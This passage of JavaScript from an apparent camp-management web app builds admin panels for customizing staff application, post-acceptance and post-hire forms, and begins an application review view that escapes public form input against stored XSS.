    if(!list)return;
    var div=document.createElement('div');
    div.innerHTML=renderCustomSection({label:'',fields:[]},_newSid(),prefix);
    list.appendChild(div.firstChild);
}
function addSectionField(prefix,sid){
    prefix=prefix||'fc';
    var list=document.getElementById(prefix+'Sec_'+sid+'List');
    if(!list)return;
    var div=document.createElement('div');
    div.innerHTML=renderCustomQ({label:'',type:'text',required:false,options:[]},-1,prefix);
    list.appendChild(div.firstChild);
}

function _renderDocRow(d){
    d=d||{};
    return '<div class="fcDoc" style="display:flex;gap:6px;align-items:center;margin-bottom:4px;padding:6px 10px;border:1px solid var(--s200);border-radius:var(--r)">'
        +'<input class="fi fcDocName" style="flex:1;font-size:.8rem;padding:5px 8px" value="'+esc(d.name||'')+'" placeholder="Document name">'
        +'<label style="font-size:.72rem;color:var(--s500);white-space:nowrap">Max files <input class="fi fcDocMax" type="number" min="1" max="20" style="width:56px;font-size:.8rem;padding:5px 6px;display:inline-block" value="'+(d.maxFiles||1)+'"></label>'
        +'<button class="me-btn me-btn--ghost" style="color:var(--err);font-size:.7rem" onclick="this.closest(\'.fcDoc\').remove()">✕</button></div>';
}
function addDocRow(){
    var list=document.getElementById('fcDocList');
    var div=document.createElement('div');
    div.innerHTML=_renderDocRow({name:'',maxFiles:1});
    list.appendChild(div.firstChild);
}

function addPromoRow(){
    var list=document.getElementById('fcPromoList');
    var div=document.createElement('div');
    div.innerHTML='<div style="display:flex;gap:6px;align-items:center;margin-bottom:4px;padding:6px 10px;border:1px solid var(--s200);border-radius:var(--r)"><input class="fi fcPromoCode" style="flex:0 0 120px;font-size:.8rem;padding:5px 8px" placeholder="CODE"><input class="fi fcPromoLabel" style="flex:1;font-size:.8rem;padding:5px 8px" placeholder="Label"><input class="fi fcPromoPct" style="flex:0 0 60px;font-size:.8rem;padding:5px 8px" placeholder="% off"><input class="fi fcPromoAmt" style="flex:0 0 60px;font-size:.8rem;padding:5px 8px" placeholder="$ off"><button class="me-btn me-btn--ghost" style="color:var(--err);font-size:.7rem" onclick="this.closest(\'div\').remove()">✕</button></div>';
    list.appendChild(div.firstChild);
}

// ═══════════════════════════════════════════════════════════════
// STAFF APPLICATION FORM CUSTOMIZER — mirrors the parent Form
// Customizer above (getFormConfig/openFormConfig/saveFormConfig),
// driving campistry_staff_apply.html the same way formConfig drives
// campistry_register.html.
// ═══════════════════════════════════════════════════════════════
var SFC_POSITIONS_DEFAULT=['Counselor','Head Counselor','Junior Counselor','Specialist','Lifeguard','Nurse / Medical','Kitchen Staff','Maintenance','Office Staff','Bus Driver','Division Head'];
var SFC_CERTS_DEFAULT=['CPR','First Aid','Lifeguard (WSI)','Food Handler','Wilderness First Responder','EMT','Teaching license'];

// Nothing here is locked — same rationale as FC_SECTIONS/FC_FIELD_CATALOG
// above. `default` just sets the out-of-the-box state.
var SFC_SECTIONS=[
    {key:'about',label:'About You',desc:'Name, contact info, address',default:true},
    {key:'role',label:'Role & Availability',desc:'Position(s), available dates',default:true},
    {key:'experience',label:'Experience & Certifications',desc:'Education, experience, certifications, resume',default:true},
    {key:'references',label:'References',desc:'Two reference contacts',default:true},
    {key:'consent',label:'Consent & Signature',desc:'Background check consent, signature',default:true}
];

var SFC_FIELD_CATALOG={
    about:[
        {id:'first',label:'First Name',required:true},
        {id:'last',label:'Last Name',required:true},
        {id:'email',label:'Email',required:true},
        {id:'phone',label:'Phone',required:true},
        {id:'dob',label:'Date of Birth'},
        {id:'street',label:'Street Address'},
        {id:'city',label:'City'},
        {id:'state',label:'State'},
        {id:'zip',label:'ZIP'},
        {id:'photo',label:'Photo'}
    ],
    role:[
        {id:'availStart',label:'Available From'},
        {id:'availEnd',label:'Available Until'}
    ],
    experience:[
        {id:'education',label:'Education'},
        {id:'experience',label:'Relevant Experience'},
        {id:'resume',label:'Resume Upload'}
    ]
};

function getStaffFormConfig(){
    if(staffFormConfig)return staffFormConfig;
    var sections={};
    SFC_SECTIONS.forEach(function(s){sections[s.key]={enabled:s.default}});
    return{sections:sections,customQuestions:[],customSections:[],welcomeMessage:'',instructions:'',fields:{},sectionOrder:SFC_SECTIONS.map(function(s){return s.key}),branding:{},positions:SFC_POSITIONS_DEFAULT.slice(),certifications:SFC_CERTS_DEFAULT.slice()};
}

function _renderChipEditRow(cls,val){
    return '<div class="'+cls+'" style="display:flex;gap:6px;align-items:center;margin-bottom:4px">'
        +'<input class="fi '+cls+'Val" style="flex:1;font-size:.82rem;padding:5px 8px" value="'+esc(val||'')+'">'
        +'<button type="button" class="me-btn me-btn--ghost" style="color:var(--err);font-size:.7rem" onclick="this.closest(\'.'+cls+'\').remove()">✕</button></div>';
}
function addPositionRow(){
    var list=document.getElementById('sfcPosList');
    var div=document.createElement('div');
    div.innerHTML=_renderChipEditRow('sfcPos','');
    list.appendChild(div.firstChild);
}
function addCertRow(){
    var list=document.getElementById('sfcCertList');
    var div=document.createElement('div');
    div.innerHTML=_renderChipEditRow('sfcCert','');
    list.appendChild(div.firstChild);
}
function _readChipList(cls){
    return Array.prototype.map.call(document.querySelectorAll('.'+cls+'Val'),function(el){return (el.value||'').trim();}).filter(Boolean);
}

function _buildSfcPanelHtml(){
    var fc=getStaffFormConfig();
    var h=_fcTabBarHtml('sfc');

    // ── QUICK SETUP — each settings group is its own closed drawer ──
    h+='<div id="sfcTabQuick">';

    var welcomeHtml='<div class="fg"><label class="fl">Welcome Message</label><input class="fi" id="sfcWelcome" value="'+esc(fc.welcomeMessage||'')+'" placeholder="e.g., Join our team at Camp Sunrise!"></div>'
        +'<div class="fg" style="margin-bottom:0"><label class="fl">Instructions for Applicants</label><textarea class="fi" id="sfcInstructions" style="min-height:50px;resize:vertical" placeholder="Any special instructions shown at the top of the form">'+(fc.instructions||'')+'</textarea></div>';
    h+=_accCard('Welcome Message',welcomeHtml,{open:true});

    var sfcQSplit=_customQuestionsSplit('sfc',fc.customQuestions);
    var sectionsHtml='<p style="font-size:.78rem;color:var(--s400);margin:0 0 10px">Turn sections on or off. Click a section to add or edit fields right inside it.</p>'
        +_renderSectionsListHtml('sfc',SFC_SECTIONS,fc,'sfcSec',sfcQSplit.bySection);
    h+=_accCard('Sections',sectionsHtml,{open:true});

    var positions=(fc.positions&&fc.positions.length?fc.positions:SFC_POSITIONS_DEFAULT);
    var posHtml='<p style="font-size:.78rem;color:var(--s400);margin:0 0 10px">The list of positions an applicant can select from.</p>'
        +'<div id="sfcPosList">'+positions.map(function(p){return _renderChipEditRow('sfcPos',p);}).join('')+'</div>'
        +'<button class="me-btn me-btn--sec me-btn--sm" style="margin-top:4px" onclick="CampistryMe.addPositionRow()">+ Add Position</button>';
    h+=_accCard('Positions',posHtml,{badge:positions.length+' positions'});

    var certs=(fc.certifications&&fc.certifications.length?fc.certifications:SFC_CERTS_DEFAULT);
    var certHtml='<p style="font-size:.78rem;color:var(--s400);margin:0 0 10px">The list of certifications an applicant can select from.</p>'
        +'<div id="sfcCertList">'+certs.map(function(c){return _renderChipEditRow('sfcCert',c);}).join('')+'</div>'
        +'<button class="me-btn me-btn--sec me-btn--sm" style="margin-top:4px" onclick="CampistryMe.addCertRow()">+ Add Certification</button>';
    h+=_accCard('Certifications',certHtml,{badge:certs.length+' certifications'});

    var qHtml='<p style="font-size:.78rem;color:var(--s400);margin:0 0 10px">Standalone questions, shown in an "Additional Information" section. Pick "Show in" to move one inside a built-in section instead (or add it from that section directly, in Sections above).</p>'
        +'<div id="sfcQList">'+sfcQSplit.flat.map(function(q,i){return renderCustomQ(q,i,'sfc',true);}).join('')+'</div>'
        +'<button class="me-btn me-btn--sec me-btn--sm" style="margin-top:6px" onclick="CampistryMe.addStaffCustomQ()">+ Add Question</button>';
    h+=_accCard('Custom Questions',qHtml,{badge:sfcQSplit.flat.length+' added',wrapId:'sfcQCard'});

    var sfcSecs=fc.customSections||[];
    var sfcSecHtml='<p style="font-size:.78rem;color:var(--s400);margin:0 0 10px">Build your own multi-field sections — a labeled group of fields, shown as its own section on the form.</p>'
        +'<div id="sfcSecList">'+sfcSecs.map(function(s){return renderCustomSection(s,_newSid(),'sfc');}).join('')+'</div>'
        +'<button type="button" class="me-btn me-btn--sec me-btn--sm" style="margin-top:6px" onclick="CampistryMe.addCustomSection(\'sfc\')">+ Add Section</button>';
    h+=_accCard('Custom Sections',sfcSecHtml,{badge:sfcSecs.length+' added'});
    h+='</div>'; // /sfcTabQuick

    // ── ADVANCED — same drawer pattern; fields are grouped by section ──
    h+='<div id="sfcTabAdv" style="display:none">';

    var brandHtml='<div class="fg"><label class="fl">Camp Logo</label>'
        +'<input type="hidden" id="sfcLogoData" value="'+esc((fc.branding&&fc.branding.logo)||'')+'">'
        +'<img id="sfcLogoPreview" src="'+esc((fc.branding&&fc.branding.logo)||'')+'" style="display:'+((fc.branding&&fc.branding.logo)?'block':'none')+';max-height:60px;max-width:200px;margin-bottom:6px;border-radius:6px">'
        +'<div style="display:flex;gap:8px;align-items:center"><input type="file" accept="image/*" class="fi" style="flex:1" onchange="CampistryMe._brandingLogoPick(\'sfc\',this)"><button type="button" class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe._brandingLogoClear(\'sfc\')">Remove</button></div></div>'
        +'<div class="fg" style="margin-bottom:0"><label class="fl">Accent Color</label><input type="color" id="sfcAccentColor" value="'+esc((fc.branding&&fc.branding.color)||'#D97706')+'" style="width:60px;height:34px;padding:2px;border:1.5px solid var(--s200);border-radius:var(--r);cursor:pointer"></div>';
    h+=_accCard('Branding',brandHtml,{open:true});

    var orderHtml='<p style="font-size:.78rem;color:var(--s400);margin:0 0 10px">Reorder how sections appear on the form.</p>'+_renderSectionOrderList('sfc',SFC_SECTIONS,fc.sectionOrder);
    h+=_accCard('Section Order',orderHtml,{open:true});

    var fieldsHtml='<p style="font-size:.78rem;color:var(--s400);margin:0 0 10px">Show/hide, require, or relabel individual fields — pick a section to open it.</p>';
    Object.keys(SFC_FIELD_CATALOG).forEach(function(sectionKey){
        var sec=SFC_SECTIONS.filter(function(s){return s.key===sectionKey})[0];
        var rows=SFC_FIELD_CATALOG[sectionKey].map(function(f){return _renderAdvFieldRow('sfc',sectionKey,f,(fc.fields||{})[f.id]);}).join('');
        fieldsHtml+=_accCard(sec?sec.label:sectionKey,rows,{sub:true});
    });
    h+=_accCard('Field-by-Field Control',fieldsHtml,{});
    h+='</div>'; // /sfcTabAdv
    return h;
}
function openStaffFormConfig(){ openFormBuilder('staff'); }

function saveStaffFormConfig(){
    staffFormConfig=_collectStaffFormConfigDraft();
    save();
    closeFormBuilder();
    toast('Staff application form configuration saved');
}

// ═══════════════════════════════════════════════════════════════
// POST-ACCEPTANCE FORM CUSTOMIZER — mirrors the parent Form Customizer
// above, driving campistry_postaccept.html the same way formConfig drives
// campistry_register.html. Adds one thing the others don't have: a
// "Sending" toggle deciding whether the form goes out automatically the
// moment an applicant is marked Accepted, or only when the office sends
// it manually from the Review modal.
// ═══════════════════════════════════════════════════════════════
function _buildPafPanelHtml(){
    var fc=getPostAcceptFormConfig();
    var h=_fcTabBarHtml('paf');

    // ── QUICK SETUP ──
    h+='<div id="pafTabQuick">';

    var welcomeHtml='<div class="fg"><label class="fl">Welcome Message</label><input class="fi" id="pafWelcome" value="'+esc(fc.welcomeMessage||'')+'" placeholder="e.g., Welcome to the family! A few more choices before camp starts."></div>'
        +'<div class="fg" style="margin-bottom:0"><label class="fl">Instructions for Parents</label><textarea class="fi" id="pafInstructions" style="min-height:50px;resize:vertical" placeholder="Any special instructions shown at the top of the form">'+(fc.instructions||'')+'</textarea></div>';
    h+=_accCard('Welcome Message',welcomeHtml,{open:true});

    var sendHtml='<label style="display:flex;align-items:center;gap:10px;padding:4px 0;cursor:pointer">'
        +'<input type="checkbox" id="pafAutoSend" '+(fc.autoSend?'checked':'')+' style="accent-color:var(--me);flex-shrink:0;width:16px;height:16px">'
        +'<div><div style="font-size:.85rem;font-weight:600;color:var(--s800)">Send automatically on acceptance</div>'
        +'<div style="font-size:.72rem;color:var(--s400)">When on, this form is emailed the moment an applicant is marked Accepted. When off, send it yourself from the applicant\'s Review panel whenever you\'re ready.</div></div></label>';
    h+=_accCard('Sending',sendHtml,{open:true});

    var pafQSplit=_customQuestionsSplit('paf',fc.customQuestions);
    var sectionsHtml='<p style="font-size:.78rem;color:var(--s400);margin:0 0 10px">Turn sections on or off. Click a section to add or edit fields right inside it.</p>'
        +_renderSectionsListHtml('paf',PAF_SECTIONS,fc,'pafSec',pafQSplit.bySection);
    h+=_accCard('Sections',sectionsHtml,{open:true});

    // Create a packing list right here — separate from Link's Lists feature
    // (an interactive, per-child check-off list in the parent portal that
    // requires the parent to be signed in). This one is just plain text
    // saved on the form config itself, rendered read-only on the public
    // page with a Print button so the family can print it and pack from
    // paper — no login, no per-child state to manage.
    var pk=fc.printableList||{name:'',items:[]};
    var pkItemCount=(pk.items||[]).length;
    var pkHtml='<p style="font-size:.78rem;color:var(--s400);margin:0 0 10px">A simple printable list — parents view and print it right from this form. For the interactive per-child checklist in the parent portal, use "Attach an Existing List" below instead.</p>'
        +'<div class="fg"><label class="fl">List Title</label><input class="fi" id="pafPkName" value="'+esc(pk.name||'')+'" placeholder="e.g., What to Pack"></div>'
        +'<div class="fg" style="margin-bottom:0"><label class="fl">Items (one per line)</label><textarea class="fi" id="pafPkItems" style="min-height:110px;resize:vertical" placeholder="6 t-shirts&#10;Sunscreen&#10;Water bottle&#10;Sleeping bag">'+esc((pk.items||[]).join('\n'))+'</textarea></div>';
    h+=_accCard('Your Packing List',pkHtml,{badge:pkItemCount?pkItemCount+' items':''});

    // Attach existing Lists (packing lists / checklists) from Link — shown
    // read-only right on the public form so parents see them without
    // needing portal access yet. Lists themselves are still created/edited
    // in Link → Lists; this just picks which ones show here.
    var allLists=_getLinkLists();
    var attachedIds=fc.attachedListIds||[];
    var listsHtml;
    if(!allLists.length){
        listsHtml='<p style="font-size:.78rem;color:var(--s400);margin:0">No lists yet. Create a packing list or checklist in <strong>Link → Lists</strong>, then come back here to attach it.</p>';
    }else{
        listsHtml='<p style="font-size:.78rem;color:var(--s400);margin:0 0 10px">Attach an existing Link list — parents see it right on this form.</p>';
        allLists.forEach(function(l){
            var n=(l.items||[]).length;
            var checked=attachedIds.indexOf(l.id)>=0;
            listsHtml+='<label style="display:flex;align-items:center;gap:10px;padding:8px 10px;border-bottom:1px solid var(--s100);cursor:pointer">'
                +'<input type="checkbox" class="pafListAttach" value="'+esc(l.id)+'" '+(checked?'checked':'')+' style="accent-color:var(--me);flex-shrink:0;width:16px;height:16px">'
                +'<div style="flex:1"><div style="font-size:.85rem;font-weight:600;color:var(--s800)">'+esc(l.name)+'</div>'
                +'<div style="font-size:.72rem;color:var(--s400)">'+n+' item'+(n!==1?'s':'')+'</div></div></label>';
        });
    }
    h+=_accCard('Attach an Existing List',listsHtml,{badge:attachedIds.length?attachedIds.length+' attached':''});

    var qHtml='<p style="font-size:.78rem;color:var(--s400);margin:0 0 10px">Standalone questions, shown in an "Additional Information" section. Pick "Show in" to move one inside a built-in section instead (or add it from that section directly, in Sections above).</p>'
        +'<div id="pafQList">'+pafQSplit.flat.map(function(q,i){return renderCustomQ(q,i,'paf',true);}).join('')+'</div>'
        +'<button class="me-btn me-btn--sec me-btn--sm" style="margin-top:6px" onclick="CampistryMe.addPafCustomQ()">+ Add Question</button>';
    h+=_accCard('Custom Questions',qHtml,{badge:pafQSplit.flat.length+' added',wrapId:'pafQCard'});

    var pafSecs=fc.customSections||[];
    var pafSecHtml='<p style="font-size:.78rem;color:var(--s400);margin:0 0 10px">Build your own multi-field sections — a labeled group of fields, shown as its own section on the form.</p>'
        +'<div id="pafSecList">'+pafSecs.map(function(s){return renderCustomSection(s,_newSid(),'paf');}).join('')+'</div>'
        +'<button type="button" class="me-btn me-btn--sec me-btn--sm" style="margin-top:6px" onclick="CampistryMe.addCustomSection(\'paf\')">+ Add Section</button>';
    h+=_accCard('Custom Sections',pafSecHtml,{badge:pafSecs.length+' added'});
    h+='</div>'; // /pafTabQuick

    // ── ADVANCED ──
    h+='<div id="pafTabAdv" style="display:none">';

    var brandHtml='<div class="fg"><label class="fl">Camp Logo</label>'
        +'<input type="hidden" id="pafLogoData" value="'+esc((fc.branding&&fc.branding.logo)||'')+'">'
        +'<img id="pafLogoPreview" src="'+esc((fc.branding&&fc.branding.logo)||'')+'" style="display:'+((fc.branding&&fc.branding.logo)?'block':'none')+';max-height:60px;max-width:200px;margin-bottom:6px;border-radius:6px">'
        +'<div style="display:flex;gap:8px;align-items:center"><input type="file" accept="image/*" class="fi" style="flex:1" onchange="CampistryMe._brandingLogoPick(\'paf\',this)"><button type="button" class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe._brandingLogoClear(\'paf\')">Remove</button></div></div>'
        +'<div class="fg" style="margin-bottom:0"><label class="fl">Accent Color</label><input type="color" id="pafAccentColor" value="'+esc((fc.branding&&fc.branding.color)||'#D97706')+'" style="width:60px;height:34px;padding:2px;border:1.5px solid var(--s200);border-radius:var(--r);cursor:pointer"></div>';
    h+=_accCard('Branding',brandHtml,{open:true});

    var orderHtml='<p style="font-size:.78rem;color:var(--s400);margin:0 0 10px">Reorder how sections appear on the form.</p>'+_renderSectionOrderList('paf',PAF_SECTIONS,fc.sectionOrder);
    h+=_accCard('Section Order',orderHtml,{open:true});

    var fieldsHtml='<p style="font-size:.78rem;color:var(--s400);margin:0 0 10px">Show/hide, require, or relabel individual fields — pick a section to open it.</p>';
    Object.keys(PAF_FIELD_CATALOG).forEach(function(sectionKey){
        var sec=PAF_SECTIONS.filter(function(s){return s.key===sectionKey})[0];
        var rows=PAF_FIELD_CATALOG[sectionKey].map(function(f){return _renderAdvFieldRow('paf',sectionKey,f,(fc.fields||{})[f.id]);}).join('');
        fieldsHtml+=_accCard(sec?sec.label:sectionKey,rows,{sub:true});
    });
    h+=_accCard('Field-by-Field Control',fieldsHtml,{});
    h+='</div>'; // /pafTabAdv
    return h;
}
function openPostAcceptFormConfig(){ openFormBuilder('postaccept'); }
function addPafCustomQ(){ addCustomQ('paf'); }

function savePostAcceptFormConfig(){
    paFormConfig=_collectPostAcceptFormConfigDraft();
    save();
    closeFormBuilder();
    toast('Post-acceptance form configuration saved');
}

function _buildPhfPanelHtml(){
    var fc=getPostHireFormConfig();
    var h=_fcTabBarHtml('phf');

    // ── QUICK SETUP ──
    h+='<div id="phfTabQuick">';

    var welcomeHtml='<div class="fg"><label class="fl">Welcome Message</label><input class="fi" id="phfWelcome" value="'+esc(fc.welcomeMessage||'')+'" placeholder="e.g., Welcome to the team! A few more details before camp starts."></div>'
        +'<div class="fg" style="margin-bottom:0"><label class="fl">Instructions</label><textarea class="fi" id="phfInstructions" style="min-height:50px;resize:vertical" placeholder="Any special instructions shown at the top of the form">'+(fc.instructions||'')+'</textarea></div>';
    h+=_accCard('Welcome Message',welcomeHtml,{open:true});

    var sendHtml='<label style="display:flex;align-items:center;gap:10px;padding:4px 0;cursor:pointer">'
        +'<input type="checkbox" id="phfAutoSend" '+(fc.autoSend?'checked':'')+' style="accent-color:var(--me);flex-shrink:0;width:16px;height:16px">'
        +'<div><div style="font-size:.85rem;font-weight:600;color:var(--s800)">Send automatically on hire</div>'
        +'<div style="font-size:.72rem;color:var(--s400)">When on, this form is emailed the moment a candidate is marked Hired. When off, send it yourself from the applicant\'s Review panel whenever you\'re ready.</div></div></label>';
    h+=_accCard('Sending',sendHtml,{open:true});

    var phfQSplit=_customQuestionsSplit('phf',fc.customQuestions);
    var sectionsHtml='<p style="font-size:.78rem;color:var(--s400);margin:0 0 10px">Turn sections on or off. Click a section to add or edit fields right inside it.</p>'
        +_renderSectionsListHtml('phf',PHF_SECTIONS,fc,'phfSec',phfQSplit.bySection);
    h+=_accCard('Sections',sectionsHtml,{open:true});

    // Staff Handbook — an actual attached PDF, shown as a download link next
    // to the "Handbook Acknowledged" checkbox in Acknowledgments, so a hire
    // has something real to read before checking that box.
    var hb=fc.handbook||{};
    var hbHtml='<p style="font-size:.78rem;color:var(--s400);margin:0 0 10px">Attach your staff handbook (PDF, max 8MB) — a hire can view/download it right next to the acknowledgment checkbox.</p>'
        +'<input type="hidden" id="phfHandbookData" value="'+esc(hb.data||'')+'">'
        +'<input type="hidden" id="phfHandbookName" value="'+esc(hb.name||'')+'">'
        +'<div id="phfHandbookPreview" style="'+(hb.data?'':'display:none')+';font-size:.82rem;font-weight:600;color:var(--s700);margin-bottom:8px">📄 '+esc(hb.name||'')+'</div>'
        +'<div style="display:flex;gap:8px;align-items:center"><input type="file" accept="application/pdf" class="fi" style="flex:1" onchange="CampistryMe._phfHandbookPick(this)"><button type="button" class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe._phfHandbookClear()">Remove</button></div>';
    h+=_accCard('Staff Handbook',hbHtml,{badge:hb.data?'attached':''});

    // Camp Policies & Requirements — a camp-defined list of hard rules (no
    // smoking, no smartphones, etc.) each a required checkbox, plus a typed
    // signature confirming agreement to all of them — distinct from the
    // built-in Acknowledgments section's fixed handbook/photo checkboxes,
    // since every camp's specific rules differ.
    var policies=fc.policies||[];
    var polHtml='<p style="font-size:.78rem;color:var(--s400);margin:0 0 10px">Rules every hire must agree to and sign — e.g. "No smoking on camp grounds," "No smartphones during camp hours." Each becomes its own required checkbox on the form, with a signature at the end.</p>'
        +'<div id="phfPolicyList">'+policies.map(function(p){return _renderPolicyRow(p);}).join('')+'</div>'
        +'<button type="button" class="me-btn me-btn--sec me-btn--sm" style="margin-top:6px" onclick="CampistryMe.addPhfPolicyRow()">+ Add Policy</button>';
    h+=_accCard('Camp Policies & Requirements',polHtml,{badge:policies.length?policies.length+' policies':''});

    var qHtml='<p style="font-size:.78rem;color:var(--s400);margin:0 0 10px">Standalone questions, shown in an "Additional Information" section. Pick "Show in" to move one inside a built-in section instead (or add it from that section directly, in Sections above).</p>'
        +'<div id="phfQList">'+phfQSplit.flat.map(function(q,i){return renderCustomQ(q,i,'phf',true);}).join('')+'</div>'
        +'<button class="me-btn me-btn--sec me-btn--sm" style="margin-top:6px" onclick="CampistryMe.addPhfCustomQ()">+ Add Question</button>';
    h+=_accCard('Custom Questions',qHtml,{badge:phfQSplit.flat.length+' added',wrapId:'phfQCard'});

    var phfSecs=fc.customSections||[];
    var phfSecHtml='<p style="font-size:.78rem;color:var(--s400);margin:0 0 10px">Build your own multi-field sections — a labeled group of fields, shown as its own section on the form.</p>'
        +'<div id="phfSecList">'+phfSecs.map(function(s){return renderCustomSection(s,_newSid(),'phf');}).join('')+'</div>'
        +'<button type="button" class="me-btn me-btn--sec me-btn--sm" style="margin-top:6px" onclick="CampistryMe.addCustomSection(\'phf\')">+ Add Section</button>';
    h+=_accCard('Custom Sections',phfSecHtml,{badge:phfSecs.length+' added'});
    h+='</div>'; // /phfTabQuick

    // ── ADVANCED ──
    h+='<div id="phfTabAdv" style="display:none">';

    var brandHtml='<div class="fg"><label class="fl">Camp Logo</label>'
        +'<input type="hidden" id="phfLogoData" value="'+esc((fc.branding&&fc.branding.logo)||'')+'">'
        +'<img id="phfLogoPreview" src="'+esc((fc.branding&&fc.branding.logo)||'')+'" style="display:'+((fc.branding&&fc.branding.logo)?'block':'none')+';max-height:60px;max-width:200px;margin-bottom:6px;border-radius:6px">'
        +'<div style="display:flex;gap:8px;align-items:center"><input type="file" accept="image/*" class="fi" style="flex:1" onchange="CampistryMe._brandingLogoPick(\'phf\',this)"><button type="button" class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe._brandingLogoClear(\'phf\')">Remove</button></div></div>'
        +'<div class="fg" style="margin-bottom:0"><label class="fl">Accent Color</label><input type="color" id="phfAccentColor" value="'+esc((fc.branding&&fc.branding.color)||'#D97706')+'" style="width:60px;height:34px;padding:2px;border:1.5px solid var(--s200);border-radius:var(--r);cursor:pointer"></div>';
    h+=_accCard('Branding',brandHtml,{open:true});

    var orderHtml='<p style="font-size:.78rem;color:var(--s400);margin:0 0 10px">Reorder how sections appear on the form.</p>'+_renderSectionOrderList('phf',PHF_SECTIONS,fc.sectionOrder);
    h+=_accCard('Section Order',orderHtml,{open:true});

    var fieldsHtml='<p style="font-size:.78rem;color:var(--s400);margin:0 0 10px">Show/hide, require, or relabel individual fields — pick a section to open it.</p>';
    Object.keys(PHF_FIELD_CATALOG).forEach(function(sectionKey){
        var sec=PHF_SECTIONS.filter(function(s){return s.key===sectionKey})[0];
        var rows=PHF_FIELD_CATALOG[sectionKey].map(function(f){return _renderAdvFieldRow('phf',sectionKey,f,(fc.fields||{})[f.id]);}).join('');
        fieldsHtml+=_accCard(sec?sec.label:sectionKey,rows,{sub:true});
    });
    h+=_accCard('Field-by-Field Control',fieldsHtml,{});
    h+='</div>'; // /phfTabAdv
    return h;
}
function openPostHireFormConfig(){ openFormBuilder('posthire'); }
function addPhfCustomQ(){ addCustomQ('phf'); }

function savePostHireFormConfig(){
    phFormConfig=_collectPostHireFormConfigDraft();
    save();
    closeFormBuilder();
    toast('Post-hire form configuration saved');
}

// Attached PDF handbook — read straight to a data URL (no downscaling,
// unlike _downscaleImage's photo path) with a size cap matching the
// document-upload cap already used elsewhere in these public forms.
function _phfHandbookPick(input){
    var f=input.files&&input.files[0]; if(!f)return;
    if(f.type!=='application/pdf'){ toast('Please choose a PDF file','error'); input.value=''; return; }
    if(f.size>8*1024*1024){ toast('File too large — max 8MB','error'); input.value=''; return; }
    var reader=new FileReader();
    reader.onload=function(e){
        var dataEl=document.getElementById('phfHandbookData'), nameEl=document.getElementById('phfHandbookName');
        if(dataEl)dataEl.value=e.target.result;
        if(nameEl)nameEl.value=f.name;
        var preview=document.getElementById('phfHandbookPreview');
        if(preview){preview.textContent='📄 '+f.name;preview.style.display='block';}
        if(typeof _fbPushPreview==='function')_fbPushPreview();
    };
    reader.readAsDataURL(f);
}
function _phfHandbookClear(){
    var dataEl=document.getElementById('phfHandbookData'), nameEl=document.getElementById('phfHandbookName');
    if(dataEl)dataEl.value='';
    if(nameEl)nameEl.value='';
    var preview=document.getElementById('phfHandbookPreview');
    if(preview)preview.style.display='none';
    if(typeof _fbPushPreview==='function')_fbPushPreview();
}
// Camp Policies & Requirements — a simple add/remove list of plain-text
// rules (mirrors campistry_register.html's Required Documents list
// pattern: one text input + a remove button per row, no type/required
// picker needed since every policy is implicitly required).
function _renderPolicyRow(p){
    p=p||{};
    return '<div class="phfPolicy" style="display:flex;gap:6px;align-items:center;margin-bottom:4px;padding:6px 10px;border:1px solid var(--s200);border-radius:var(--r)">'
        +'<input class="fi phfPolicyLabel" style="flex:1;font-size:.8rem;padding:5px 8px" value="'+esc(p.label||'')+'" placeholder="e.g. No smoking on camp grounds">'
        +'<button type="button" class="me-btn me-btn--ghost" style="color:var(--err);font-size:.7rem" onclick="this.closest(\'.phfPolicy\').remove()">✕</button></div>';
}
function addPhfPolicyRow(){
    var list=document.getElementById('phfPolicyList');
    if(!list)return;
    var div=document.createElement('div');
    div.innerHTML=_renderPolicyRow({label:''});
    list.appendChild(div.firstChild);
}
function _readPhfPolicies(){
    var i=0;
    return Array.prototype.map.call(document.querySelectorAll('#phfPolicyList .phfPolicyLabel'),function(el){return (el.value||'').trim();})
        .filter(Boolean)
        .map(function(label){return {id:'p'+(i++),label:label};});
}

function saveFormConfig(){
    formConfig=_collectFormConfigDraft();

    // Promo codes live in enrollSettings (not formConfig) so they persist
    // through the main save() path — read separately.
    var promos={};
    var codes=document.querySelectorAll('.fcPromoCode');
    var labels=document.querySelectorAll('.fcPromoLabel');
    var pcts=document.querySelectorAll('.fcPromoPct');
    var amts=document.querySelectorAll('.fcPromoAmt');
    for(var i=0;i<codes.length;i++){
        var code=(codes[i].value||'').trim().toUpperCase();
        if(!code)continue;
        promos[code]={label:(labels[i]?.value||'').trim(),pct:parseFloat(pcts[i]?.value)||0,amt:parseFloat(amts[i]?.value)||0};
    }
    enrollSettings.promoCodes=promos;

    save();
    closeFormBuilder();
    toast('Form configuration saved');
}

// View full application (review modal)
function viewApplication(id){
    var e=enrollments[id];if(!e)return;
    var sc=e.status==='enrolled'?'ok':e.status==='accepted'?'ok':e.status==='waitlisted'?'warn':e.status==='declined'||e.status==='withdrawn'?'err':'gray';

    var headPhoto=(e.camperPhoto&&isSafeImageDataUrl(e.camperPhoto))?'<img src="'+e.camperPhoto+'" style="width:40px;height:40px;object-fit:cover;border-radius:9px;flex-shrink:0">':'';
    var head='<div style="display:flex;justify-content:space-between;align-items:flex-start"><div style="display:flex;align-items:center;gap:10px">'+headPhoto+'<div><h3 style="font-size:1.1rem;font-weight:700;color:var(--s800);margin:0">'+esc(e.camperName||'Application')+'</h3><div style="display:flex;gap:5px;margin-top:5px">'+bdg(e.status||'applied',sc)+' '+bdg(e.session||'No session','gray')+'</div></div></div><button class="me-modal-x" onclick="CampistryMe.closeModal(\'appViewModal\')">&times;</button></div>';
    document.getElementById('avHead').innerHTML=head;

    var b='';
    // Each sec() closes the previous section's card and opens a new one, so
    // the whole body reads as a stack of grouped cards instead of one long
    // undifferentiated text dump. The final open card is closed just before
    // it's written to avBody, below.
    var _secOpen=false;
    function sec(title){
        var out=_secOpen?'</div>':'';
        _secOpen=true;
        return out+'<div class="av-sec"><div class="av-sec-hd">'+title+'</div>';
    }
    // ★★★ STORED-XSS HARDENING (mirrors printApplication): every enrollment
    // field originates from the UNAUTHENTICATED public registration form
    // (campistry_register.html). row() now ESCAPES the value by default; use
    // rowRaw() only for HTML we built ourselves (links / pre-escaped spans).
    function row(l,v){if(!v)return'';return'<div class="av-row"><span class="av-row-l">'+esc(l)+'</span><span class="av-row-v">'+esc(v)+'</span></div>'}
    function rowRaw(l,v){if(!v)return'';return'<div class="av-row"><span class="av-row-l">'+esc(l)+'</span><span class="av-row-v">'+v+'</span></div>'}
